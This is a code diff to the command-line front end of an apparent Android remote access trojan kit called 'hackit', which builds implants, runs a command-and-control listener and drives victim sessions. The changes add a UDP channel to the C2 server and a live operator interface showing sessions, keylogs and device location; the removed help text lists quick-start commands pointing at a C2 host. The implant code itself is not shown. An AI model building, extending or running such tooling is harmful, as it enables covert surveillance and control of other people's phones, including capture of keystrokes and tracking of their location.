@@ -15,9 +15,9 @@ import secrets
 
 import click
 
-from hackit.ui import _colored, B_CYAN, B_GREEN, DIM, GREEN, RED
+from hackit.ui import _colored, B_GREEN, DIM, GREEN, RED
 
-from . import builder, console, protocol, server, store
+from . import builder, console, menu, protocol, server, store, ui
 
 HOME = store.ROOT
 PSK_PATH = os.path.join(HOME, "psk.txt")
@@ -33,13 +33,7 @@ def _psk_b64(path: str) -> str:
 def rat(ctx):
     """Android RAT bench — build implant, run C2, drive sessions."""
     if ctx.invoked_subcommand is None:
-        click.echo(_colored("  rat bench — subcommands:", B_CYAN))
-        for name in ("doctor", "keygen", "build", "serve", "console", "sessions"):
-            click.echo(f"    {_colored(name, B_GREEN)}")
-        click.echo(_colored("\n  quick start:", DIM))
-        click.echo("    hackit rat keygen --host https://c2.example.com")
-        click.echo("    hackit rat build --config ~/.hackit/rat/agent.json")
-        click.echo("    hackit rat console")
+        menu.interactive()
 
 
 @rat.command()
@@ -91,10 +85,11 @@ def build(config_path, engine, debug, out):
 @rat.command()
 @click.option("--host", default="0.0.0.0", show_default=True)
 @click.option("--port", default=8443, show_default=True, type=int)
+@click.option("--udp", "udp_port", default=None, type=int, help="native UDP port (default http port + 100)")
 @click.option("--public-url", default="", help="URL printed in the dashboard (default http://127.0.0.1:port)")
 @click.option("--psk", "psk_path", default=PSK_PATH, show_default=True)
 @click.option("--token", default=None, help="operator token (generated when omitted)")
-def serve(host, port, public_url, psk_path, token):
+def serve(host, port, udp_port, public_url, psk_path, token):
     """Run the C2 listener headless."""
     store.init()
     url = public_url or f"http://127.0.0.1:{port}"
@@ -102,7 +97,7 @@ def serve(host, port, public_url, psk_path, token):
         server.write_psk(psk_path)
         click.echo(_colored(f"  minted {psk_path}", DIM))
     try:
-        server.run(host, port, psk_path, token, url)
+        server.run(host, port, psk_path, token, url, udp_port or port + 100)
     except KeyboardInterrupt:
         click.echo(_colored("\n  stopped", DIM))
 
@@ -110,15 +105,16 @@ def serve(host, port, public_url, psk_path, token):
 @rat.command()
 @click.option("--host", default="0.0.0.0", show_default=True)
 @click.option("--port", default=8443, show_default=True, type=int)
+@click.option("--udp", "udp_port", default=None, type=int, help="native UDP port (default http port + 100)")
 @click.option("--public-url", default="", help="URL baked into new builds")
 @click.option("--psk", "psk_path", default=PSK_PATH, show_default=True)
-def control(host, port, public_url, psk_path):
+def control(host, port, udp_port, public_url, psk_path):
     """Listener + interactive operator console in one process."""
     store.init()
     if not os.path.exists(psk_path):
         server.write_psk(psk_path)
     key = server.load_psk(psk_path)
-    console.run(host, port, key, public_url or f"http://127.0.0.1:{port}")
+    console.run(host, port, key, public_url or f"http://127.0.0.1:{port}", udp_port or port + 100)
 
 
 @rat.command()
@@ -169,5 +165,18 @@ def mint(label):
 
 rat.add_command(control, name="console")
 rat.add_command(control, name="control")
+
+
+@rat.command()
+@click.option("--host", default="0.0.0.0", show_default=True)
+@click.option("--port", default=8443, show_default=True, type=int)
+@click.option("--udp", "udp_port", default=None, type=int, help="native UDP port (default http port + 100)")
+@click.option("--public-url", default="", help="URL shown in the UI header")
+@click.option("--psk", "psk_path", default=PSK_PATH, show_default=True)
+def run(host, port, udp_port, public_url, psk_path):
+    """Live operator UI: sessions, feed, keylog and location."""
+    store.init()
+    key = server.load_psk(psk_path) if os.path.exists(psk_path) else server.write_psk(psk_path)
+    ui.run(host, port, key, public_url or f"http://127.0.0.1:{port}", udp_port or port + 100)
 
 __all__ = ["rat"]
